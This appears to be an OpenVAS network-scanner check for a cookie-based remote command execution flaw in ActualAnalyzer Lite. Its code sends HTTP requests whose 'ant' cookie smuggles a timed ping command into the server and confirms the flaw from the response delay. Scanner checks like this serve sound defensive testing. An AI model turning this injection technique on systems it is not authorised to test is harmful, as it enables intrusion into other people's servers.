if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804761" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-09-03 13:22:44 +0530 (Wed, 03 Sep 2014)" );
	script_name( "ActualAnalyzer Lite 'ant' Cookie Parameter Remote Command Execution Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with ActualAnalyzer Lite and is prone to remote code
  execution vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it is
  able to execute the code remotely." );
	script_tag( name: "insight", value: "Flaw exists because the 'ant' cookie parameter is not properly sanitized
  upon submission to the /aa.php script." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary code in the
  affected system." );
	script_tag( name: "affected", value: "ActualAnalyzer Lite version 2.81 and probably prior." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/34450" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
host = http_host_name( port: http_port );
for dir in nasl_make_list_unique( "/", "/actualanalyzer", "/statistics", "/lite", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/admin.php" ), port: http_port );
	if(ContainsString( rcvRes, ">ActualAnalyzer Lite" )){
		url = dir + "/aa.php?anp=" + get_host_name();
		if( os_host_runs( "Windows" ) == "yes" ){
			ping = "ping -n ";
			wait_extra_sec = 5;
		}
		else {
			ping = "ping -c ";
			wait_extra_sec = 7;
		}
		sleep = make_list( 3,
			 5,
			 7 );
		for sec in sleep {
			sndReq = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ant=", ping, sec, " 127.0.0.1; anm=414.`$cot`", "\\r\\n\\r\\n" );
			start = unixtime();
			rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq, bodyonly: FALSE );
			stop = unixtime();
			time_taken = stop - start;
			time_taken = time_taken + 1;
			if(time_taken + 1 < sec || time_taken > ( sec + wait_extra_sec )){
				exit( 0 );
			}
		}
		security_message( port: http_port );
		exit( 0 );
	}
}
exit( 99 );

